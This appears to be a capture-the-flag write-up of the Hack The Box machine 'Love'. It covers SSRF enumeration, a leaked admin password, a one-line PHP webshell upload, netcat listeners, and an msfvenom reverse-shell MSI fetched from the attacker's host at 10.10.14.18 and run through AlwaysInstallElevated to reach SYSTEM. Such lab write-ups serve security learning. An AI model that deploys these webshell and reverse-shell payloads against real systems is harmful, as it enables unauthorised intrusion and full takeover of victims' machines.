# Love

## 1. Introduction

### 1.2 Background

During the initial phase, an Apache server running on Windows was identified executing an application called **Voting System using PHP**.

Additionally, a subdomain `staging.love.htb` was detected, indicating the possible existence of a testing environment.

The key to the initial compromise was an SSRF vulnerability in `/beta.php`.

### 1.3 Objectives

- Obtain initial access to the system  
- Escalate privileges to Administrator / SYSTEM  

---

## 2. Enumeration

### 2.1 Nmap

The process begins with an Nmap scan:

```bash
nmap -sCV -p- love.htb
```

Relevant ports:

- 80 → Apache + PHP (Voting System)  
- 443 → staging.love.htb  
- 445 → SMB  
- 3306 → MariaDB  

The main page displayed a voting system with a login for voters.

An interesting endpoint was discovered:

```
/beta.php
```

This allowed entering a URL → SSRF vulnerability confirmed.

### 2.2 SSRF Discovered

The parameter allowed queries to:

```
http://127.0.0.1
```

This allowed enumeration of internal services not externally visible.

During internal enumeration, an endpoint was found that revealed:

```
Vote Admin Creds
admin : @LoveIsInTheAir!!!!
```

---

## 3. Exploitation

### 3.1 Access to Admin Panel

The obtained credentials were tested at:

```
http://love.htb/admin
```

Successful login as administrator.

### 3.2 Webshell Upload

From the panel, uploading a PHP file was allowed.

A simple webshell was uploaded:

```php
<?php system($_GET['cmd']); ?>
```

The file became accessible at:

```
http://love.htb/images/shell.php
```

RCE confirmation:

```bash
whoami
```

Result:

```
love\phoebe
```

### 3.3 Reverse Shell

A reverse shell was executed in PowerShell:

Listener on Kali:

```
rlwrap nc -lvnp 9001
```

From the webshell:

```
powershell -c "..."
```

Shell obtained as:

```
love\phoebe
```

---

# 4. Post-Exploitation

## 4.1 Privilege Enumeration

Privileges were checked:

```
whoami /priv
```

No special privileges.

Checked:

```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Confirmed:

```
AlwaysInstallElevated = 1
```

### 4.2 AppLocker Bypass

It was observed that AppLocker restricted MSI execution except in specific directories allowed for:

- Phoebe  
- Administrator  

The corresponding exploit was used for bypass.

### 4.3 Payload MSI Generation

A malicious MSI was created with:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.18 LPORT=4444 -f msi > reverse.msi
```

Python server:

```bash
python3 -m http.server 8000
```

Listener:

```bash
rlwrap nc -lvnp 4444
```

### 4.4 Execution as SYSTEM

On the victim machine:

```powershell
wget 10.10.14.18:8000/reverse.msi -o reverse.msi
msiexec /quiet /i reverse.msi
```

Shell received as:

```
nt authority\system
```
